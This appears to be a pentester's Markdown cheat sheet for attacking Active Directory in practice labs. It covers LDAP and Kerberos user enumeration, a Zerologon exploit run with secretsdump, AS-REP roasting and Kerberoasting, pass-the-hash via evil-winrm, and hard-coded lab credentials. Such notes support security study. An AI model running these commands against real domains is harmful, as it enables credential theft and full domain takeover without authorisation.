# Active Directory

## Initial Scans
| Scan Type | Description | Command  |
| -------------------|-----------------------|:----------------------------------------------------------------------|
| LDAP   | Scan LDAP with nmap | `nmap -p 389 -sC -sV $ip` |
| LDAP  | Domain Enumeration | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip"` |
| LDAP  | Get User account description field | `ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://$ip" | grep description` |
| LDAP | Get User account with creds | `GetADUsers.py -all active.htb/svc_tgs -dc-ip $ip` |
| User Enumeration | Scan for valid usersnames | `kerbrute userenum --dc $ip -d zero.csl /usr/share/seclists/Usernames/Names/names.txt`

## Zero Login
`python3 cve-2020-1472-exploit.py -t $ip -n ZERO-DC`

`secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29`

## Get All Objects using PowerShell
Code
```PowerShell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```


ldapsearch -x -h $ip -p 389 -D ​'SVC_TGS'​ -w ​'GPPstillStandingStrong2k18' 
-b ​"dc=active,dc=htb"​ -s sub 
"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.
4.803:=2)))"​ samaccountname | grep sAMAccountName 

## Steal Hashes

* From Userlist (Check if preauthentication is enabled (If not we can steal hashes))
`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py fusion.corp/ -no-pass -usersfile users.txt -request`
* Single Account (Check if we can get an account password to crack (ticket))
`python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass`
* Enumerate shares with credentials
`smbmap -H spookysec.local -u svc-admin -p management2005 -d spookysec.local`
* Connect to share with creds
`smbclient //$ip/backup -U "svc-admin"`
* Dump Secrets
`secretsdump.py -just-dc backup:backup2517860@spookysec.local`
* Pass the hash
`evil-winrm -i $ip -H 0e0363213e37b94221497260b0bcb4fc --user Administrator`
* Connect using evil-winrm and creds
`evil-winrm -i fusion.corp -u lparker -p '!!abbylvzsvs2k6!'`

# Kerberoast
GetUserSPNs.py -request -dc-ip $ip active.htb/svc_tgs
